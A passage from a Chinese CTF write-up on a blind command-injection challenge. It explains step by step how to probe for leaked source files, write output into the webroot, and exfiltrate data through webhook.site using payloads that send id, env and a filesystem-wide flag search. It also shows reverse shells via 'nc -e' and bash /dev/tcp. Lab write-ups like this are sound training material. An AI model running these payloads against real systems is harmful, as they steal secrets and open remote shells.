> 11. `action=`：form 的 action 属性，代表表单提交到哪个地址
> 12. `|` 在双引号内部：正则里的**或**，多个关键词任选一个命中就输出
>
> - 这个是 **PowerShell 命令**，不是 cmd！黑色 cmd 窗口直接跑会报错，要开 PowerShell（蓝色窗口）
> - Linux 里面等价写法（你后面学 kali 会见到）：
>
> ```
> curl -s "url" -o page.html
> grep -E "form|textarea|input|name=|action=" page.html
> ```
>
> >
> > Linux 的 `grep -E` ≈ Windows PowerShell 的 `Select-String`
>

![image-20261020190425305](/assets/web-security-wp/image-20261020190425305.png)

或者通过右键网页查看源代码

![image-20261020190731244](/assets/web-security-wp/image-20261020190731244.png)

结果：

```
<form method="POST">
    <textarea id="code" name="code" placeholder="whoami"></textarea>
    <button type="submit">Execute Code</button>
```

> | 内容        | 英文原意                     | 身份（标签 / 属性 / 属性值） | 作用说明                                     |
> | ----------- | ---------------------------- | ---------------------------- | -------------------------------------------- |
> | form        | 表单                         | 标签                         | 表单容器，包裹所有提交控件                   |
> | method      | 方法、方式                   | 属性名                       | 指定表单数据的提交方式                       |
> | POST        | 投递                         | 属性值                       | HTTP 提交方式，数据放请求体，不在 url 上显示 |
> | textarea    | 文本区域                     | 标签                         | 多行输入框，可以输入换行的长文本             |
> | id          | 标识、编号                   | 属性名                       | 元素唯一编号，给 JS/CSS 使用，表单提交不用它 |
> | code        | 代码                         | 属性值                       | id 的值，同时也是 name 的值                  |
> | name        | 名字                         | 属性名                       | 表单提交核心，后端识别这个参数的键名         |
> | placeholder | 占位符                       | 属性名                       | 输入框为空时，灰色提示文字                   |
> | whoami      | （linux 命令：查看当前用户） | 属性值                       | 提示文字，仅展示，不会提交给后端             |
> | button      | 按钮                         | 标签                         | 定义一个按钮                                 |
> | type        | 类型                         | 属性名                       | 定义按钮的功能类型                           |
> | submit      | 提交                         | 属性值                       | 代表点击这个按钮就提交整个 form 表单         |
> | Execute     | 执行                         | 普通文本                     | 按钮展示文字一部分                           |
> | Code        | 代码                         | 普通文本                     | 按钮展示文字一部分                           |
>
> - `<input type="text">`：单行输入，不能换行
> - `<textarea></textarea>`：多行输入，可以换行写多行内容
>
> > 确定：method 指定 POST 提交；name 决定提交参数键；placeholder 仅提示；type="submit" 触发表单提交。
>

（3）常规敏感路径扫一遍

```
curl.exe -s -o NUL -w "/robots.txt %{http_code}n"      "<URL>/robots.txt"
curl.exe -s -o NUL -w "/.git/HEAD %{http_code}n"       "<URL>/.git/HEAD"
curl.exe -s -o NUL -w "/index.php.bak %{http_code}n"   "<URL>/index.php.bak"
curl.exe -s -o NUL -w "/www.zip %{http_code}n"         "<URL>/www.zip"
```

> | 内容                       | 英文原意                 | 身份          | 作用说明                                                     |
> | -------------------------- | ------------------------ | ------------- | ------------------------------------------------------------ |
> | curl.exe                   | （工具名）               | 程序          | Windows 自带 curl，发起 HTTP 请求                            |
> | `-s`                       | silent 安静              | curl 参数     | 静默模式，关掉进度条、下载提示，输出干净                     |
> | `-o`                       | output 输出              | curl 参数     | 指定把响应体（网页内容）写到哪里                             |
> | `NUL`                      | 空设备（Windows）        | `-o` 的参数值 | 相当于 Linux 的 `/dev/null`：**丢掉返回的页面内容，不保存、不打印页面源码** |
> | `-w`                       | write-out 输出自定义内容 | curl 参数     | 请求结束之后，按照你写的模板打印一行自定义文字               |
> | /robots.txt %{http_code}`n | 自定义输出模板           | `-w` 的参数   | 模板内容：1. `/robots.txt` 是我们探测的路径。2. `%{http_code}` curl 内置变量，代表 HTTP 状态码（200/404/403）3. **`n**–> PowerShell 换行符，打印完这一行自动换行 |
> | `<URL>/robots.txt`         | 目标地址                 | curl 最后位置 | 真正要访问的完整 URL，`<URL>`替换成靶机地址，例如`http://127.0.0.1/robots.txt` |
>
> >
> > 后面三行结构完全一模一样，只是换了探测的路径：
> >
> >
> > - `/.git/HEAD`
> > - `/index.php.bak`
> > - `/www.zip`
>
> 探测路径:
>
> 1. `/robots.txt`
> robots.txt：网站爬虫协议文件。网站管理员在这里写哪些路径不让搜索引擎爬。
> 里面经常泄露后台地址、隐藏文件路径。
>
> - 返回 200：存在，可以去看内容
> - 404：不存在
> - 403：存在但是不让直接访问
>
> 2. `/.git/HEAD`
> git 版本仓库文件！
> 如果这个文件能访问，说明网站源码目录放了 `.git` 仓库，**可以用 GitHacker、dvcs-ripper 把整站源码扒下来**。
> HEAD 是 git 仓库里用来记录当前分支的文件。
> 3. `/index.php.bak`
> bak = backup，备份文件。
> 程序员改代码的时候，经常备份一份：`index.php` → 备份成 `index.php.bak`
> 如果没删掉，直接下载就能拿到源代码！PHP 源码不会被服务器解析，直接明文拿到。
> 4. `/www.zip`
> 网站源码压缩包。管理员打包整个网站目录成 zip，忘记删掉。访问就能直接下载全部源码。
>
> **Q1:为什么这么写？**
>
> 普通 curl：
>
> ```
> curl http://xxx/robots.txt
> ```
>
> 会把整个页面内容打印出来，内容很长，干扰看结果。
>
> 所以加：
>
> - `-o NUL`：不要页面内容，直接扔掉，**不下载、不输出页面**
> - -w "xxx %{http_code}`n"：只打印【路径名 + 状态码】
>
> - 200：文件存在（成功访问）,正常返回
> - 404：找不到，不存在,没有这个文件
> - 403：存在，但是禁止访问,有这个资源，服务器拒绝给你看
>
> **信息收集（敏感文件扫描）**，手动小字典，快速测试靶机上这 4 个高危敏感文件是否存在。
> 不用工具，原生 curl 扫，看状态码判断有没有源码泄露、备份泄露、git 泄露。

（4）建立行为基线

>Q1:什么是基线?
>
>你拿这个标准去对比服务器、网站现在的状态，不一样的地方就是异常、风险点。
>
>> 类比：体检的参考值。
>> 血常规报告单上的参考范围就是基线；你的数值超出参考基线 → 代表异常。

```
curl.exe -s -X POST --data-urlencode "code=id" "<URL>"
curl.exe -s -o NUL -w "time=%{time_total}s`n" -X POST --data-urlencode "code=sleep 3" "<URL>"
```

> | 内容                      | 英文原意          | 身份                  | 详细说明                                                     |
> | ------------------------- | ----------------- | --------------------- | ------------------------------------------------------------ |
> | curl.exe                  | 工具名称          | 程序                  | Windows 自带 curl，用来发送 HTTP 请求                        |
> | `-s`                      | silent 安静       | curl 参数             | 静默模式，隐藏进度条、无关提示，输出干净                     |
> | `-X`                      | request method    | 参数                  | 指定 HTTP 请求方法                                           |
> | `POST`                    | 投递              | `-X` 的参数值         | 使用 POST 方式提交（和 form 标签 method="POST" 对应）        |
> | `--data-urlencode`        | 编码后的数据      | curl 参数             | 把后面的键值对自动做 URL 编码，再放到 POST 请求体里传给后端（如果有空格、特殊符号会自动转义，不容易出错） |
> | `"code=id"`               | POST 数据内容     | --data-urlencode 的值 | 键值对：`code` 就是表单里的 name="code"值是 `id`（Linux 命令，查看当前用户） |
> | `"<URL>"`                 | 目标地址          | 请求的目标            | 替换成靶机地址，例如 `http://127.0.0.1`                      |
> | `-o`                      | output 输出       | curl 参数             | 指定响应内容写到哪里                                         |
> | `NUL`                     | 空设备（Windows） | `-o`的值              | 丢弃服务器返回的页面内容，不保存、不打印页面                 |
> | `-w`                      | write-out         | curl 参数             | 请求结束后，自定义打印输出内容                               |
> | `"time=%{time_total}s`n"` | 自定义输出模板    | `-w`的值              | `%{time_total}` 是 curl 内置变量：本次请求总共耗时多少秒`s` 只是给人看的单位秒；`\`n` 是 PowerShell 换行 |
> | `sleep 3`                 | 休眠 3 秒         | code 参数的值         | Linux 命令：让系统暂停 / 休眠 3 秒钟                         |
>
> 第一条命令的作用：
> 用 POST 提交 `code=id`，发给后端，后端会执行 `id` 系统命令，**直接返回执行结果**（回显型命令执行）。
> 类比：你在网页 textarea 输入`id`，点 Execute Code 提交。
>
> 第二条命令的作用：
> 提交 `code=sleep 3`，同时**扔掉页面返回内容，只打印整个请求花费的时间**
>
> - 如果后端真的执行了 sleep 3，请求会卡住大约 3 秒才结束，输出类似 `time=3.020s`
> - 如果没有执行 sleep，请求一瞬间就返回，时间大概 0.0 几秒
>
> 这个就是**时间盲命令执行**：页面没有回显，只能靠响应时间判断命令有没有跑成功！
>
> 1. `--data-urlencode "code=xxx"` 等价于表单 POST 提交，`code` 对应 `<textarea name="code">` 的 name 属性
> 提交的数据就是键值对 `code=你传入的值`
> 2. `-X POST` 和 `<form method="POST">` 对应，就是指定 POST 请求
> 3. 第一条是**有回显的命令执行**，直接看返回结果
> 4. 第二条是**盲命令执行**，利用延时 sleep 判断是否漏洞存在
>
> - `sleep 3` 是 linux 命令；windows 系统是 `timeout /t 3`
> - `--data-urlencode` 和 `-d`（--data）区别：
>   - `-d "code=sleep 3"` 直接原样发送，空格特殊符号容易翻车
>   - `--data-urlencode` 自动编码，写 payload 推荐这个以免出错
> - `%{time_total}`：curl 统计从发请求到收到全部响应一共花多久
>

（5）按情报选路线

> | 侦察结论                  | 选什么路线                         |
> | ------------------------- | ---------------------------------- |
> | 盲执行 + **webroot 可写** | A：复制文件到网站目录（第 5.2 节） |
> | 盲执行 + 能出网           | B：webhook 外带（第 5.3 节）       |
> | 有公网监听端              | C：反弹 shell（第 5.4 节）         |
>
> Q1：什么是webroot？
>
> - web = 网页、网站
>
> - root = 根、根部
> 	**webroot = Web 根目录（网站根目录）**
>
> > 就是 Web 服务器（Apache / Nginx）**对外提供访问的那个文件夹**，你放在这个文件夹里的文件，才能通过浏览器 URL 访问。
>
> Q2:什么是 webhook？
>
> ## 单词拆解
>
> - web = 网页网络
> - hook = 钩子（挂钩、触发）
> 	**webhook = Web 钩子，也叫回调接口**
>
> A 服务发生某件事的时候，**自动发一个 HTTP POST 请求，推送消息给 B 服务**，不用 B 一直轮询去问 A。
>
> >
> > 核心：**事件驱动，主动推送**
>
> **Webhook 外带（http 外带）:**
>
> >
> > 当目标不让你往 webroot 写文件的时候，就用 webhook！
> > payload 例子：
>
> ```
> cat /flag | curl -d @- https://你的webhook地址
> ```
>
> 服务器读到 flag，自动 POST 发送到你的 webhook 平台，你打开 webhook 页面就能看到 flag 内容。
>
> 常用临时 webhook 平台：RequestBin、Webhook.site（用来接收外带数据）
>

##### 2.3看源码

###### （1）`curl.exe` 直接看不到 PHP 源码

```
curl.exe "https://xxx/index.php"      
```

拿到的是**服务器执行完 PHP 之后吐出的 HTML**，不是源码，服务器端的 PHP 代码，永远不会以"源码"形式发给浏览器。

###### （2）让靶机把源码复制到网站目录

思路：**既然命令能执行，就让靶机自己把文件复制一份到能通过 URL 访问的地方。**

```
curl.exe -s -X POST --data-urlencode "code=cat /var/www/html/index.php > /var/www/html/s.txt" "<URL>"
curl.exe -s "<URL>/s.txt"
```

> 这是**命令执行漏洞的一句话写文件攻击**，属于无回显命令执行的经典思路：
>
> > 不能直接看到命令返回结果 → 先把结果写入网站目录下的一个新文件`s.txt`，再单独访问这个文件读出内容。
> > 还是配套前面那个 `name="code"` 的 POST 表单页面。
>
> | 内容                                                       | 英文原意                 | 身份                  | 说明                                                         |
> | ---------------------------------------------------------- | ------------------------ | --------------------- | ------------------------------------------------------------ |
> | `"code=cat /var/www/html/index.php > /var/www/html/s.txt"` | POST 提交的数据          | --data-urlencode 的值 | 键是`code`（对应表单 name="code"）；值是要后端执行的 Linux 命令 |
> | `cat`                                                      | 拼接、读取（linux 命令） | 系统命令              | 读取文件内容                                                 |
> | `/var/www/html/index.php`                                  | 文件路径                 | cat 参数              | Linux 网站根目录，网站主页源码文件                           |
> | `>`                                                        | 重定向符号（shell）      | shell 语法            | **输出重定向**：把前面命令的输出，写入后面的文件，而不是打印输出 |
> | `/var/www/html/s.txt`                                      | 目标写入文件             | 重定向目标            | 在网站根目录新建 s.txt，把读到的内容放进去                   |
> | `"<URL>"`                                                  | 靶机地址                 | 请求目标              | 你的目标网页地址                                             |
> | 第二行 `curl.exe -s "<URL>/s.txt"`                         |                          |                       | 直接 GET 访问刚才生成的 `/s.txt`，下载、打印 s.txt 里面的内容 |
>

 [1]POST 发包，让服务器执行写入文件的 shell 命令

传给后端 `code` 参数的值：

```
cat /var/www/html/index.php > /var/www/html/s.txt
```

这条 Linux 命令含义：
读取 `/var/www/html/index.php` 的源码，**不回显到网页上**，而是把内容写到同目录的 `s.txt`。

> `/var/www/html` 是 Apache 网页根目录，这个目录里的文件可以直接通过浏览器 /curl 访问。
>
> 重点：`>` 是覆盖写入！如果 s.txt 本来就存在，里面旧内容会被清空替换成 index.php 的内容。
> （如果是 `>>` 就是追加，不会清空旧内容）

[2]读取我们刚刚生成的 s.txt

```
curl.exe -s "<URL>/s.txt"
```

访问 `http://xxx/s.txt`，服务器直接返回 s.txt 里保存的 index.php 源码，我们就能看到原本 PHP 源码了！

> **Q1：为什么这么做？**
>
> 场景：这个命令执行漏洞**没有回显**
>
> - 直接输入 `cat index.php`，页面上什么都不输出；
> - 没法直接看到文件内容；
> - 但是服务器允许写入文件到 web 可访问目录；
>  方案：**把执行结果重定向输出到 web 目录下的文件，再单独请求这个文件拿数据**。
>

[3]需要满足 3 个前提（缺一不可，不然失败）

1. 存在命令执行漏洞，传入的 code 参数会直接交给系统 shell 执行；
2. Web 进程的权限**有读 index.php、写 / 创建 s.txt 的权限**；
3. `/var/www/html/` 这个目录是网站对外可访问的（可以通过 url 直接访问里面的 txt 文件）。

> 如果失败，则是：
>
> 1. 如果网站根目录不是 `/var/www/html`（比如 nginx 有的是 `/usr/share/nginx/html`），写这个路径会失败；
> 2. 权限不足：www-data 用户没有写权限，s.txt 创建失败；
> 3. 防火墙 / 配置禁止访问 txt 文件，就算生成了也 403/404 拿不到；
> 4. `>` 在 shell 里是特殊符号，这里用 `--data-urlencode` 自动编码，就不会在发包的时候乱掉。

同一招也能尝试拿 flag：

```
curl.exe -s -X POST --data-urlencode "code=cat /var/www/html/flag.php > /var/www/html/f.txt" "<URL>"
curl.exe -s "<URL>/f.txt"
```

> 读取：`index.php` → 写入 `s.txt`
> 目的：拿**网站主页源码**，看后端 PHP 代码、审计漏洞。
>
> 读取：`flag.php` → 写入 `f.txt`
> 目的：拿**flag**（CTF 比赛最终目标，flag 字符串用来提交得分）

> `cat /var/www/html/flag.php` 是在服务器操作系统层面读原始文件，**不经过 PHP 解析**，拿到的是完整原始源码。
>
> | 版本   | cat 读取的文件            | 写入的文件 | 目标                             |
> | ------ | ------------------------- | ---------- | -------------------------------- |
> | 上一条 | `/var/www/html/index.php` | `s.txt`    | 获取主页源码，看代码逻辑、找漏洞 |
> | 这一条 | `/var/www/html/flag.php`  | `f.txt`    | 获取 flag，拿到比赛答案          |
>
> 注意：**flag.php 是 PHP 文件**
> 如果你直接访问 `/flag.php`，服务器会**解析执行 PHP**，只会输出 PHP 打印出来的内容，**看不到源码**！
> 举个例子：flag.php 里面是
>
> ```
> <?php
> $flag = "ctf{abc123}";
> echo $flag;
> ?>
> ```
>
> 浏览器直接访问 flag.php，大概率只能看到 `ctf{abc123}`；
> 但如果 flag 是写在 PHP 源码注释里：
>
> ```
> <?php
> // flag{this_is_secret}
> highlight_file(__FILE__);
> ?>
> ```
>
> 直接访问拿不到注释里的 flag，**必须用 cat 读取源码**。
>
> 1. curl 发 POST 包，`code` 参数的值交给服务器 shell 执行：
> 	`cat /var/www/html/flag.php > /var/www/html/f.txt`
> 	服务器读取 flag.php 原始源码，写入 f.txt
> 2. 再用 curl 去请求 `http://<URL>/f.txt`
> 	f.txt 是普通 txt，服务器不会解析 PHP，原样返回文件内容 → 拿到 flag。

![image-20261020225013612](/assets/web-security-wp/image-20261020225013612.png)

![image-20261020225035739](/assets/web-security-wp/image-20261020225035739.png)

 [4]源码全文

```
<form method="POST">
    <textarea id="code" name="code" placeholder="whoami"><?php 
        if (isset($_POST['code'])) {
            echo htmlspecialchars($_POST['code']);
        }
    ?></textarea>
</form>

<?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['code'])): ?>
    <div class="form-group">
        <label>Execution Result:</label>
        <div class="result"><?php
            try {
                ob_start();                    // 开始"接住"输出
                shell_exec($_POST['code']);    // 执行命令（返回值没人接）
                $output = ob_get_clean();      // 接住的内容 → $output
                echo "execute success!";       // 只打印这句固定的
            } catch (Exception $e) {
                echo 'Error: ' . htmlspecialchars($e->getMessage());
            }
        ?></div>
    </div>
<?php endif; ?>
```

1. **漏洞点**：`shell_exec($_POST['code'])` —— 用户输入**直接**进系统命令，没有任何过滤。
2. **为什么"盲"**：输出被 `$output` 接住，**但下一行直接丢弃**，改成打印死字符串 `"execute success!"`。
3. **为什么 `sleep 3` 会卡**：`shell_exec` 是**阻塞执行**的，命令跑完才返回 → 耗时可以当"是否执行"的证据。

##### 2.4 解题：三条路线

###### （1）路线 A：复制文件到网站目录

```
# ① 复制
curl.exe -s -X POST --data-urlencode "code=cat /var/www/html/flag.php > /var/www/html/f.txt" "<URL>"

# ② 读取
curl.exe -s "<URL>/f.txt"

# ③ 清理
curl.exe -s -X POST --data-urlencode "code=rm -f /var/www/html/f.txt" "<URL>"
```

| 优点           | 缺点                     |
| -------------- | ------------------------ |
| 2 条命令，简单 | 要求 webroot 可写        |
| 不用外部服务   | 会在目标留文件（有痕迹） |

###### （2） 路线 B：webhook 外带

###### [1]确认"盲执行"

页面表单（或 curl）发两条：

| 输入      | 你会看到                      | 说明           |
| --------- | ----------------------------- | -------------- |
| `whoami`  | `execute success!`            | 有执行，没回显 |
| `sleep 5` | 页面**卡 5 秒**后显示同样的话 | **命令执行了** |

 [2]机制

| 可能                                    | 对策         |
| --------------------------------------- | ------------ |
| 输出被丢弃（`ob_get_clean` 接走没打印） | 带外通道     |
| 命令成功但结果为空                      | 换命令再确认 |
| 压根没执行                              | 放弃这条路   |

[3]选通道：走带外

> 页面上没有输出通道，那就让靶机自己把结果运出来。

 [4]搭通道

**先建"信箱"**：

```
curl.exe -s -X POST "https://webhook.site/token"
```

返回 JSON 里记下 `"uuid":"..."`。之后：

- 投信（靶机访问）：`http://webhook.site/<UUID>/任意路径`

- 取信（你回读）：`https://webhook.site/token/<UUID>/requests?sorting=newest`

	> Q1:`/requests?sorting=newest`是什么意思？
	>
	> 是**路径部分 `/requests`** + **查询字符串（参数）`sorting=newest`**
	>
	> >
	> > 整个 `?` 后面的内容就是 URL 的**查询参数（GET 参数）**，`?` 是分隔符号：前面是访问的资源路径，`?`之后是给页面的参数。
	>
	> | 片段        | 含义           | 解释                                                         |
	> | ----------- | -------------- | ------------------------------------------------------------ |
	> | `/requests` | 资源路径       | 代表访问 webhook.site 网站下的 **requests（请求记录）页面**。webhook.site 收到所有别人发来的 HTTP 请求，全部保存在`requests`资源里；这一页就是查看收到过的全部请求记录。 |
	> | `?`         | 分隔符         | URL 中，用来隔开「访问路径」和「GET 查询参数」。`?`前面是去哪，`?`后面是附带的参数。 |
	> | `sorting`   | 参数键 (key)   | 英文 sorting = 排序，告诉后端：按照什么规则做排序。对应表单里的`name`的角色。 |
	> | `newest`    | 参数值 (value) | newest = 最新的；`sorting=newest`含义：**按时间，最新收到的请求排在最上面**。 |
	>
	> ```
	> /requests?sorting=newest
	> ```
	>
	> >
	> > 访问请求记录列表，**将记录按照【最新收到的请求】优先排序（新请求显示在列表顶部）**。
	>
	> 1. 这是 **URL GET 参数**，格式就是 `键=值`，和 form 表单 method="GET" 拼接出来的格式一样。
	> 2. 如果不写 `?sorting=newest`，`https://webhook.site/token/<UUID>/requests` 也能打开请求列表，只是可能默认==按最旧的排在前面==。
	> 3. 等价逻辑类比：就好比 `?file=flag`，`file`是键，`flag`是值；这里`sorting`是键，`newest`是值。
	>
	> - `/requests?sorting=newest` → 最新的请求在第一条
	> - `/requests?sorting=oldest` → 最古老最早收到的请求排在第一条
	>
	> 当你用命令执行，把 flag 通过 HTTP 外带发送到 webhook.site。
	> 打开这个 URL，`sorting=newest`保证：**刚刚靶机发过来那条携带 flag 的请求会出现在列表最顶上，不用往下翻历史记录**。
	>
	> **Q2:什么是UUID？**
	>
	> （Universally Unique Identifier：**通用唯一识别码**）
	>
	> **一串全世界几乎不会重复的随机长编号**，用来区分不同对象。

**测出网**：

```
curl -s http://webhook.site/<UUID>/ping_curl
```

```
wget -q -O- http://webhook.site/<UUID>/ping_wget
```

> **Q1：什么是ping_curl？**
>
> - ping：ping，探测、打招呼、连通测试
> - curl：就是 curl 这个工具
>
> 往你这个 webhook 的 **`/ping_curl` 这个子路径**发一条 GET 请求。
>
> 同理：wget也一样

**取信**：

```powershell
curl.exe -s "https://webhook.site/token/<UUID>/requests?sorting=newest"
```

实测：

```
[GET] .../ping_curl     UA=curl/7.52.1     ← 有 curl，能出网 
（ping_wget 没有出现）                       ← 没有 wget
```

**看一下能使用哪些工具**：

```
curl -s http://webhook.site/<UUID>/tools --data-binary "$( (which bash sh nc python perl curl wget; bash --version | head -1; nc -h 2>&1 | head -3) 2>&1 )"
```

测试结果：

```
/bin/bash
/bin/sh
/bin/nc          ← nc v1.10 传统版，支持 -e
/usr/bin/python
/usr/bin/perl
/usr/bin/curl
（没有 wget / python3 / socat / ncat，也就是说这些工具使用不了）
```

> 知道能使用哪些工具之后：
> 有 `nc -e` → 路线 C 可用；有 `curl` → 路线 B 可用。

 [5]侦察

payload:

```
curl -s http://webhook.site/<UUID>/recon1 --data-binary "$( (id; uname -a; pwd; echo ---ROOT---; ls -la /; echo ---CWD---; ls -la; echo ---ENV---; env; echo ---FIND---; find / -iname '*flag*' 2>/dev/null) 2>&1 )"
```

> | 内容                                | 含义                                 | 说明                                                         |
> | ----------------------------------- | ------------------------------------ | ------------------------------------------------------------ |
> | `http://webhook.site/<UUID>/recon1` | URL 目标地址                         | webhook 专属地址；`recon1` 是自定义路径标记，代表这是一次信息搜集（recon）数据包 |
> | `--data-binary`                     | curl 参数                            | 把后面的数据**原样、二进制方式**放在 POST 请求体里发送，不做 URL 编码（和 `--data-urlencode` 不一样） |
> | `"内容"`                            | 双引号                               | 包裹字符串，保留换行、空格                                   |
> | `$( ... )`                          | shell 命令替换                       | 先执行括号里面的 shell 命令，把命令输出结果拿出来，当成传给 curl 的数据 |
> | `( 命令1; 命令2; ... )`             | 子 shell                             | 开一个独立的小 shell 环境，依次顺序执行里面所有命令          |
> | `;`                                 | shell 分隔符                         | 一条命令跑完，接着跑下一条，不管上一条成功失败               |
> | `id`                                | Linux 命令                           | 查看当前执行用户（uid、gid，看权限是 www-data 还是 root）    |
> | `uname -a`                          | Linux 命令                           | 查看系统内核版本、主机架构（判断系统版本）                   |
> | `pwd`                               | Linux 命令                           | 打印**当前工作目录**（现在在哪一个文件夹）                   |
> | `echo ---ROOT---`                   | echo = 打印                          | 打印分隔标记字符串，方便你在 webhook 返回内容里区分区块      |
> | `ls -la /`                          | ls=list                              | 列出**根目录 /**下全部文件，包括隐藏文件、详细权限           |
> | `echo ---CWD---`                    | echo 打印分隔符                      | CWD = current working directory，当前目录标记                |
> | `ls -la`                            | 列出当前目录所有文件、隐藏文件、权限 | 看当前 web 目录里有什么文件                                  |
> | `echo ---ENV---`                    | 环境变量区块标记                     |                                                              |
> | `env`                               | Linux 命令                           | 打印全部环境变量，很多时候 flag 藏在环境变量里               |
> | `echo ---FIND---`                   | 搜索 flag 区块标记                   |                                                              |
> | `find / -iname '*flag*'`            | find 搜索命令                        | 从根目录 `/` 开始全局搜索，文件名包含 flag（大小写不敏感 `-iname`） |
> | `2>/dev/null`                       | 重定向错误流                         | 把所有报错（权限不足、禁止访问的报错）扔掉，避免报错信息混进来干扰结果 |
> | `2>&1`                              | 流合并                               | 把**标准错误输出**合并到**标准输出**。意思：正常输出 + 报错（没被 2>/dev/null 过滤掉的）全部一起捕获，打包发给 curl |
>
> > shell 执行顺序：**最里面先跑**
> >
> > > 1.最内层：`( 一堆命令 )` 子 shell，依次执行：
> >
> > ```
> > id
> > uname -a
> > pwd
> > echo ---ROOT---
> > ls -la /
> > echo ---CWD---
> > ls -la
> > echo ---ENV---
> > env
> > echo ---FIND---
> > find / -iname '*flag*' 2>/dev/null
> > ```
> >
> > 每一条的输出，全部拼接在一起，变成一大段文本。
> >
> > 2. `2>&1`：保证**错误信息也被抓进来**，和正常输出放一块
> > 3. `$( ... )`：捕获上面这一大段输出文本，变成一个字符串
> > 4. `--data-binary "捕获到的文本"`：把这一大段文本，作为 POST 请求体发给 webhook.site
> > 5. curl 发送 POST 包到 `webhook.site/<UUID>/recon1`
> > 	靶机上批量跑一堆信息搜集命令 → 把所有输出打包 → POST 上传到你的 webhook → 你打开 webhook 就能一次性看完所有搜集结果。
> >
>
> 区分：
>
> - `--data-urlencode`：自动 ==URL 编码==，适合简单==键值对==
> - `--data-binary`：**原封不动发送**，适合一大段带换行、特殊符号、长文本的内容，这条就用它
>
> 场景：**无回显命令执行，不能直接看到命令结果，也不方便写文件到 webroot**
> 一次性做 recon（信息侦察）：
>
> - 我是谁（id）
> - 系统是什么版本（uname -a）
> - 我现在在哪个文件夹（pwd）
> - 根目录有啥、当前目录有啥
> - 全部环境变量
> - 全盘搜索名字带 flag 的文件
> - `2>/dev/null` 只过滤 find 命令自己的报错；外面的 `2>&1` 是捕获其他命令的错误输出
>
> ```
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
> Linux 6.2.0 ...
> /var/www/html
> ---ROOT---
> total ...
> drwxr-xr-x ...
> ---CWD---
> index.php
> flag.txt
> ---ENV---
> PATH=/usr/bin:...
> ---FIND---
> /flag
> /var/www/html/flag.php
> ```
>
> | 方式                   | 特点                                       |
> | ---------------------- | ------------------------------------------ |
> | sleep 3                | 只判断能不能执行命令，拿不到数据           |
> | > s.txt 写入 webroot   | 能拿数据，前提是**允许写文件到 web 目录**  |
> | webhook 外带（这一条） | 不用写文件，靶机能出网就能把所有结果发出来 |
>
> > 确定：`$(cmd)` 命令替换；`(cmd;cmd)` 子 shell 顺序执行；`--data-binary`原样 POST；`2>&1`合并输出流；这条是批量信息搜集外带 payload。
> > 需要验证：`--data-binary` 和 `--data-urlencode` 的差异、`2>/dev/null` 和 `2>&1` 区别。
>

**怎么发？**：payload 落文件，用 Python 发（PowerShell 会拆坏引号）。

```powershell
Set-Content -LiteralPath .\recon.txt -Encoding ascii -Value 'curl -s http://webhook.site/<UUID>/recon1 --data-binary "$( (id; uname -a; pwd; ls -la; env) 2>&1 )"'
Get-Content .\recon.txt
```

```powershell
python -c "import requests,urllib3;urllib3.disable_warnings();s=requests.Session();s.trust_env=False;code=open('recon.txt',encoding='utf-8').read();print(s.post('<URL>',data={'code':code},timeout=90,verify=False).status_code)"
```

**实测回信（节选）**：

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux 336ad677707b 5.4.0-163-generic ... GNU/Linux x86_64     ← Linux
/var/www/html                                                  ← 当前目录
---ROOT---      （/ 下有 .dockerenv → 容器）
---CWD---
-rw-rw-r-- 1 www-data www-data   43 Jul  8  2025 flag.php     ← 目标文件！
-rw-r--r-- 1 www-data www-data 3485 Jul  8  2025 index.php
---ENV---
FLAG=not_flag                                                  ← 诱饵！
---FIND---
/var/www/html/flag.php                                         ← 全盘唯一
```

**内容**：

- `www-data` → 低权限 Web 用户。
- `/var/www/html/flag.php` → **目标锁定**。

[6]读 `flag.php` → 拿到 Flag

**payload**：

```
curl -s http://webhook.site/<UUID>/src --data-binary "$( (echo ==FLAG.php==; cat /var/www/html/flag.php; echo; echo ==INDEX.php==; cat /var/www/html/index.php) 2>&1 )"
```

**发送 + 取信**，就得到了flag

###### （3）路线 C：反弹 shell

 **标准流程（有公网 VPS）：**

1. VPS 上开监听：

```bash
nc -lvnp 4444
```

2. 靶机端执行（本题 nc 支持 `-e`）：

```
nc -e /bin/bash <你的VPS_IP> 4444
```

若 nc 不支持 `-e`，用 bash 内建：

```
bash -c 'bash -i >& /dev/tcp/<你的IP>/4444 0>&1'
```

3. 监听端出现 shell，然后：

```bash
cat /var/www/html/flag.php
```

**三种绕过办法：**

| 办法                        | 说明                                              |
| --------------------------- | ------------------------------------------------- |
| ① 内网穿透 / 端口转发       | `frp`、`ngrok`、`ssh -R` 把本地端口暴露成公网端口 |
| ② ① HTTP 外带（本文路线 B） | 不需要接收入站                                    |
| ③ 云服务器                  | 买台 VPS 当监听端（最接近实战）                   |

> 一般来说，**出站一般放行，入站常被拦**。
> "让靶机主动连出来"是穿透 NAT/防火墙的通用思路。

##### 2.5复现

###### （1）2 条命令（需 webroot 可写）

```
curl.exe -s -X POST --data-urlencode "code=cat /var/www/html/flag.php > /var/www/html/f.txt" "<URL>"
curl.exe -s "<URL>/f.txt"
```

###### （2）4 条命令（webhook 法）

```
# ① 建信箱：返回 JSON 里拿 uuid
curl.exe -s -X POST "https://webhook.site/token"

# ② 写 payload（单引号！文件里只能有这一行）
Set-Content -LiteralPath .\code.txt -Encoding ascii -Value 'curl -s http://webhook.site/<UUID>/x --data-binary "$( (cat /var/www/html/flag.php) 2>&1 )"'
Get-Content .\code.txt

# ③ 发给靶机（trust_env=False 绕开本机失效代理）
python -c "import requests,urllib3;urllib3.disable_warnings();s=requests.Session();s.trust_env=False;code=open('code.txt',encoding='utf-8').read();print(s.post('<URL>',data={'code':code},timeout=90,verify=False).status_code)"

# ④ 取信：data[].content 里就是 flag
curl.exe -s "https://webhook.site/token/<UUID>/requests?sorting=newest"
```

